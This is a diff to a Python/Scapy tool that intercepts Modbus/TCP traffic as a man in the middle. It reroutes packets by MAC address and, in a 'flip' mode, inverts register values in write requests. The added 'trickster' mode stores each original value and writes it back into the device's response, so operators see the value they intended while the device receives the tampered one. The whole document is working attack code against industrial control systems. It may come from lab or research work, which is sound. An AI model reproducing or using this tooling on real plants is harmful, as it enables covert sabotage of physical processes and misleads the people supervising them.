@@ -53,6 +53,30 @@ MODBUS_FUNCTION_CODES = {
     0x10: "Write Multiple Registers",   #16
 }
 
+class ModifiedModbusRequest:
+    # def __init__(self, src, dst, sport,dport,funcCode,registerAddr,transId,originalValue,newValue):
+    #     self.src = src
+    #     self.dst = dst
+    #     self.sport = sport
+    #     self.dport = dport
+    #     self.funcCode = funcCode
+    #     self.registerAddr = registerAddr
+    #     self.transId = transId
+    #     self.originalValue = originalValue
+    #     self.newValue = newValue
+    def __init__(self,pkt,newValue):
+            self.src = pkt[IP].src
+            self.dst = pkt[IP].dst
+            self.sport = pkt[TCP].sport
+            self.dport = pkt[TCP].dport
+            self.funcCode = pkt[ModbusADURequest].funcCode
+            self.registerAddr = pkt[ModbusADURequest].registerAddr
+            self.transId = pkt[ModbusADURequest].transId
+            self.originalValue = pkt[ModbusADURequest].registerValue
+            self.newValue = newValue
+
+
+trickster = True # for testing
 
 def log_line(msg, log_file=None):
     line = f"[{datetime.now(timezone.utc).isoformat(timespec='seconds')}] {msg}"
@@ -216,6 +240,9 @@ def flip_all_bits(value: int, width: int = 16) -> int:
     mask = (1 << width) - 1  # e.g. 0xFFFF for 16-bit
     return value ^ mask
 
+modified_modbus_requests: dict[int, ModifiedModbusRequest] = {}
+
+    
 def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
     is_custom=False
     if crafted_pkt!="" and mode=="injection":
@@ -229,16 +256,18 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
     pkt[Ether].src=src
     pkt[Ether].dst=mappings[dst]
 
-
-
     if pkt.haslayer(ModbusADUResponse):
         if not is_retransmission(pkt):
             print("Got a modbus response")
             print_modbus_payload(pkt[ModbusADUResponse])
+            if trickster:
+                print("trickster mode enabled")
+                originalValue = modified_modbus_requests[pkt[ModbusADUResponse].transId].originalValue
+                print("Original value was: ",originalValue)
+                pkt[ModbusADUResponse].registerValue = originalValue
             sendp(pkt,loop=0,inter=0.2,verbose=0)
             return
         
-
     if pkt.haslayer(ModbusADURequest):
         if is_retransmission(pkt):
             return
@@ -276,8 +305,12 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
     elif mode=="flip": #bit flip register values
         if hasattr(pkt[ModbusADURequest],"registerValue"):
             print_modbus_payload(pkt[ModbusADURequest]) 
-            print("\nFlipped value: ", flip_all_bits(pkt[ModbusADURequest].registerValue,width=16))
-            pkt[ModbusADURequest].registerValue = flip_all_bits(pkt[ModbusADURequest].registerValue,width=16)
+            flippedValue = flip_all_bits(pkt[ModbusADURequest].registerValue,width=16)
+            print("\nFlipped value: ", flippedValue)
+
+            modified_modbus_requests[pkt[ModbusADURequest].transId] = ModifiedModbusRequest(pkt=pkt,newValue=flippedValue)
+
+            pkt[ModbusADURequest].registerValue = flippedValue
         else:
             print("Request does not have a register value.")
     del pkt[TCP].chksum
